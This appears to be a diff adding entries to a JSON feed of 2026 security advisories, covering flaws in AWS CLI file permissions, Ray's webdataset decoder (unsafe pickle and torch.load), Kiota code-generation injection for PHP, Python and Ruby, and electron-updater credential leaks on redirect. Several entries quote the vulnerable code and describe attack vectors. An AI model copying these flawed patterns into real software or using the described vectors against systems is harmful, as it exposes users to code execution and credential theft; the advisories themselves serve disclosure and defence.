+      "link": "https://github.com/advisories/GHSA-4jwf-m4wg-8p66",
+      "published": "2026-07-24T15:58:31Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59864"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-13769",
+      "title": "AWS CLI: Overly permissive File Permissions",
+      "summary": "### Summary\nThe AWS Command Line Interface (AWS CLI) is a unified tool for managing AWS services from the command line. Certain CLI subcommands wrote credential and configuration files with world-readable permissions on Unix-like systems with a default umask, allowing other local users on the same host to read credentials.\u00a0\n\n### Impact\nOn Unix-like systems with a default umask, the following AWS CLI subcommands wrote credential or configuration files with world-readable permissions (0644) instead of owner-only (0600):\u00a0\n- aws codeartifact login\u00a0\n\n- aws iam create-virtual-mfa-device\u00a0\u00a0\n\n- aws deploy register\u00a0\n\nAny other local user on the same host could read these files and obtain the credentials.\u00a0\u00a0\n\nImpacted versions: <=1.44.77 (v1) AND <=2.34.28 (v2)\n\n### Patches\nThis issue has been addressed in AWS CLI v1 version 1.44.78 and AWS CLI v2 version 2.34.29. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.\u00a0\n\nIf you have any questions or comments about this advisory, we ask that you contact AWS Security via our vulnerability reporting page or directly via email to\u00a0[aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.",
+      "link": "https://github.com/advisories/GHSA-wfp6-f47h-hxc3",
+      "published": "2026-07-24T15:49:54Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-13769"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-57516",
+      "title": "Ray: Arbitrary code execution via ray.data.read_webdataset default decoder: pickle.loads(value) and torch.load(weights_only=False)",
+      "summary": "## Summary\n\n`ray.data.read_webdataset(paths=...)` is a `@PublicAPI(stability=\"alpha\")`\nreader for WebDataset-format TAR files. Its default `decoder=True` invokes\n`_default_decoder` on every sample's keys, which routes file extension to a\ndecoder by extension. Two of those branches deserialize attacker-controlled\nbytes with no validation:\n\n- `.pickle` / `.pkl` -> `pickle.loads(value)`\n- `.pt`     / `.pth` -> `torch.load(io.BytesIO(value), weights_only=False)`\n\nBoth fire during a standard `ray.data.read_webdataset(...).take_all()` /\n`.iter_batches()` call. No flags, no opt-in, no environment variable.\nAn attacker who can supply a TAR (via S3 share, HuggingFace Hub mirror,\nemail attachment, model-zoo, or any HTTP URL the user passes to\n`read_webdataset`) achieves arbitrary code execution in the calling\nRay process at schema-sample time, before row data is consumed.\n\nThis is the same class of bug as GHSA-mw35-8rx3-xf9r (Parquet Arrow\nExtension Type cloudpickle deserialization, patched in 2.55.0): standard\ndata-loading API, attacker-controlled file format, deserialization gadget\ninvoked transparently. The 2.55.0 patch addressed\n`tensor_extensions/arrow.py:_deserialize_with_fallback` and made cloudpickle\nopt-in via `RAY_DATA_AUTOLOAD_CLOUDPICKLE_TENSOR_METADATA=1`. The\nWebDataset path is a different code site and was not touched.\n\n## Vulnerable code (HEAD `a157d4d`)\n\n`python/ray/data/_internal/datasource/webdataset_datasource.py` lines\n175-225, the `_default_decoder` function:\n\n```python\ndef _default_decoder(sample, format=True):\n    sample = dict(sample)\n    for key, value in sample.items():\n        extension = key.split(\".\")[-1]\n        ...\n        elif extension in [\"pt\", \"pth\"]:\n            import torch\n            # PyTorch 2.6 changed torch.load default weights_only=True, which\n            # breaks loading general Python objects previously serialized for\n            # WebDataset .pt payloads.\n            sample[key] = torch.load(io.BytesIO(value), weights_only=False",
+      "link": "https://github.com/advisories/GHSA-hhrp-gw25-jr43",
+      "published": "2026-07-24T15:47:38Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-57516"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59859",
+      "title": "Microsoft Kiota: Code Generation Literal Injection in Kiota PHP Generator",
+      "summary": "# Impact\n\nThe Kiota PHP code generator is vulnerable to a code generation literal injection attack. The generator embeds string values from OpenAPI fields (e.g. `description`, default values, and property names) directly into PHP double-quoted string literals without properly escaping the `$` character. Since PHP evaluates string interpolation expressions like `\"${expr}\"`, `\"$var\"`, and `\"{$obj->prop}\"` within double-quoted strings at runtime, an attacker who controls an OpenAPI specification file can inject arbitrary PHP code into generated model and request-builder classes.\n\n# Who is impacted\n\nDevelopers using Kiota to generate PHP API clients from external or untrusted OpenAPI specifications\n\nTeams with CI/CD pipelines configured to automatically regenerate client code from remote specs\n\nApplications that deploy generated PHP code to production servers\n\n# Vulnerability details\n\nAffected component: `StringExtensions.cs`\n\nRoot cause: The shared `SanitizeDoubleQuote()` function in `Writers/StringExtensions.cs` does not escape the `$` character. As a result, any schema-derived string emitted as a PHP double-quoted literal preserves `$`-prefixed interpolation constructs (`${...}`, `$var`, `{$...}`) verbatim, which PHP evaluates at runtime instead of treating as literal text. This is the same class of code-generation literal-injection flaw previously fixed for the Ruby generator (`#` interpolation), recurring here as a missed variant for PHP's `$` interpolation in the sibling sanitizer helper.\n\n# Attack vectors\n\nOpenAPI `description` and default fields in schema properties\n\nProperty wire-name keys embedded in deserializer/serializer methods\n\nAny schema-derived string embedded in PHP double-quoted literals\n\nSeverity: Critical when generated code reaches production; High for CI/CD environments with access to production secrets; Medium for public third-party specs; Low for developer-controlled specs.\n\n# Patches\n\n[#7863](https://github.com/microsoft/kiota/pull/7863)\n\n# Wor",
+      "link": "https://github.com/advisories/GHSA-jqwh-526h-c92j",
+      "published": "2026-07-24T15:46:46Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59859"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59862",
+      "title": "Microsoft Kiota: Code Generation Literal Injection in Kiota Python Generator",
+      "summary": "Code Generation Literal Injection in Kiota Python Generator Leads to Arbitrary Code Execution at Import Time.\n\nThe Kiota Python code generator is vulnerable to a code generation literal injection issue when processing malicious or untrusted OpenAPI specifications. Specifically, attacker-controlled enum value descriptions from x-ms-enum.values[].description can flow into generated Python files without newline sanitization, allowing injected content to escape a comment context and execute at module scope when the generated module is imported.\n\nThis issue requires user interaction in the form of generating a client from a malicious specification and importing the generated code, which is a common development and CI workflow.\n\n# Impact\n\nA malicious OpenAPI specification can cause arbitrary Python code to be emitted into generated model files. The payload executes when the affected module is imported.\n\n## Potential impact includes\n\nCredential theft from developer or CI environments\nExfiltration of environment variables and secrets\nSource code disclosure\nPersistence via regenerated backdoored client output\nWho is impacted\nDevelopers generating Python SDKs from external or untrusted OpenAPI specs\nTeams with CI/CD automation that regenerates clients from remote specification URLs\nAny environment importing generated Python modules before manual review\nVulnerability details\nTwo gaps combine to enable exploitation:\n\n### Enum description cleanup gap\n\nIn KiotaBuilder.SetEnumOptions, enum option descriptions are assigned to Documentation.DescriptionTemplate without CleanupDescription on this path, allowing control characters such as newlines to propagate.\n\n### Python description sanitization gap\n\nPythonConventionService.RemoveInvalidDescriptionCharacters escapes backslashes and triple quotes but did not remove carriage return/newline characters, unlike some other language convention services.\n\n# Exploit path\n\nMalicious newline in x-ms-enum description is emitted through enum writ",
+      "link": "https://github.com/advisories/GHSA-7f3j-j7jj-r3vr",
+      "published": "2026-07-24T15:45:40Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59862"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59861",
+      "title": "Microsoft Kiota: Code Generation Literal Injection in Kiota Ruby Generator",
+      "summary": "Code Generation Literal Injection in Kiota Ruby Generator Leads to Arbitrary Code Execution\n\n# Impact\n\nThe Kiota Ruby code generator is vulnerable to a code generation literal injection attack. The generator embeds string values from OpenAPI default fields and property names directly into Ruby double-quoted string literals without properly escaping the # character. Since Ruby evaluates string interpolation expressions like #{expr}, #$var, and #@var within double-quoted strings at runtime, an attacker who controls an OpenAPI specification file can inject arbitrary Ruby code into generated model classes.\n\n# Who is impacted\n\nDevelopers using Kiota to generate Ruby API clients from external or untrusted OpenAPI specifications\nTeams with CI/CD pipelines configured to automatically regenerate client code from remote specs\nApplications that deploy generated Ruby code to production servers\n\n# Vulnerability details\n\nAffected component: CodeMethodWriter.cs\nRoot cause: The shared SanitizeForQuotedLiteral() function in Writers/StringExtensions.cs does not escape the # character\n\n# Attack vectors\n\nOpenAPI default fields in schema properties\nProperty wire-name hash keys in deserializer/serializer methods\nAny schema-derived string embedded in Ruby double-quoted literals\nSeverity: Critical when generated code reaches production; High for CI/CD environments with access to production secrets; Medium for public third-party specs; Low for developer-controlled specs.\n\n# Patches\n\nhttps://github.com/microsoft/kiota/pull/7746\n\n# Workarounds\n\nIf you cannot upgrade immediately:\n\n1. Audit and sanitize OpenAPI specifications: Review all OpenAPI specification files for any default values or property names containing the # character. Remove or replace any suspicious strings before code generation.\n1. Code review of generated files: Implement mandatory code review of all generated Ruby files before merging into any branch. Look for double-quoted strings containing #{, #$, or #@ patterns.\n1. Restr",
+      "link": "https://github.com/advisories/GHSA-xg2h-5xr2-29jw",
+      "published": "2026-07-24T15:44:32Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59861"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-54673",
+      "title": "electron-updater: Cross-origin redirect leaks `PRIVATE-TOKEN` and mixed-case `Authorization` credentials in `builder-util-runtime`",
+      "summary": "## Summary\n\nIn `electron-builder`'s `builder-util-runtime` package, the HTTP redirect handler (`HttpExecutor.prepareRedirectUrlOptions`) only stripped a credential header whose key string matched exactly lowercase `\"authorization\"`. Other credential-bearing headers \u2014 most notably `PRIVATE-TOKEN` (used by GitLab's personal access token flow) and mixed-case `Authorization` (used by GitLab's Bearer/OAuth flow) \u2014 were not stripped and could be forwarded to an attacker-controlled cross-origin redirect destination.\n\n---\n\n## Details\n\n### Root cause\n\n`HttpExecutor.prepareRedirectUrlOptions` (introduced in `builder-util-runtime` via [PR #9211](https://github.com/electron-userland/electron-builder/pull/9211), first released in `v26.0.20`) performed its cross-origin credential strip with a single case-sensitive property check:\n\n```typescript\n// vulnerable code (electron-builder v26.0.20 \u2013 v26.14.x) [via builder-util-runtime <9.7.0]\nif (headers?.authorization) {\n  if (HttpExecutor.isCrossOriginRedirect(originalUrl, parsedRedirectUrl)) {\n    delete headers.authorization   // only removes the exact key \"authorization\"\n  }\n}\n```\n\nJavaScript object property access is case-sensitive. The guard `headers?.authorization` evaluates to `undefined` (falsy) when the key is `\"Authorization\"`, `\"AUTHORIZATION\"`, or any other casing, so the branch is never entered and **no header is deleted** for those cases.\n\n### Affected updater flows\n\nThe clearest reproduced path is the private GitLab updater flow.\n\n`packages/electron-updater/src/providers/GitLabProvider.ts` sets one of two credential headers depending on the token type:\n\n```typescript\n// GitLabProvider.setAuthHeaderForToken (affected versions)\nif (token.startsWith(\"Bearer\")) {\n  headers.authorization = token        // Bearer / OAuth token  \u2192  key is lowercase\n} else {\n  headers[\"PRIVATE-TOKEN\"] = token     // personal access token \u2192  key is \"PRIVATE-TOKEN\"\n}\n```\n\nDuring a private release update check, the updater requests a release asset ",
+      "link": "https://github.com/advisories/GHSA-p2f4-r6v6-j797",
+      "published": "2026-07-24T14:03:19Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-54673"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "https://thehackernews.com/2026/07/bing-images-flaws-let-crafted-svgs-run.html",
